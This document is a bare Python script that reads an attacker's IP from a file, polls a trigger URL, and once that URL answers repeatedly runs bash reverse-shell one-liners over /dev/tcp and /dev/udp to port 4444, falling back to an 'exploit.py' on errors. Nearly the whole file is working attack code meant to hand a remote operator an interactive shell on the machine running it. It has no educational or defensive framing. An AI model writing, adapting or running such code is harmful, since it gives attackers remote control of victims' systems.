import requests
import time
import os
print("running")
with open("ip.txt", "r") as f:
    user = f.read()
with open("domain.txt", "r") as g:
    response = g.read()
def tool():
    while True:
        try:
            r = requests.get(response)
            s = r.status_code
            print(s)
            if s == 200:
                a = 0
                while a < 10:
                    print("running")
                    time.sleep(3)
                    os.system(f"bash -c 'bash -i >& /dev/tcp/{user}/4444 0>&1'")
                    if a == 2:
                        os.system(f"bash -c '0<&196;exec 196<>/dev/tcp/{user}/4444; sh <&196 >&196 2>&196'")
                    if a == 3:
                        os.system(
                            f"bash -c 'exec 5<>/dev/tcp/{user}/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'")
                    if a == 4:
                        os.system(f"bash -c 'sh -i 5<> /dev/tcp/{user}/4444 0<&5 1>&5 2>&5'")
                    if a == 5:
                        os.system(f"bash -c 'sh -i >& /dev/udp/{user}/4444 0>&1'")  # optional
                a += 1

        except:
            print(user)
            time.sleep(3)
            os.system("python3 exploit.py")

tool()

